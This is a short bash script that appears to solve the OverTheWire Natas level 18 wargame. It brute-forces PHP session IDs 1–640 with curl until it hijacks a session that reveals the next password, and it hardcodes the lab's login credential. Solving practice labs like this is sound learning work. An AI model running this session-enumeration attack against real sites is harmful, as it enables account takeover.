#!/bin/bash

IDS=640
URL="natas18.natas.labs.overthewire.org/index.php/index.php?debug=1"
LOGIN="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
PASS=""

for id in $(seq 1 $IDS); do
	OUT=$(curl $URL -u $LOGIN -s -H "Cookie: PHPSESSID=$id")
	PASS=$(echo $OUT | grep "Password")

	if [ -n "$PASS" ]; then	
		echo "$OUT"
		exit
	fi
done

echo "Password for natas18: $PASS"
	

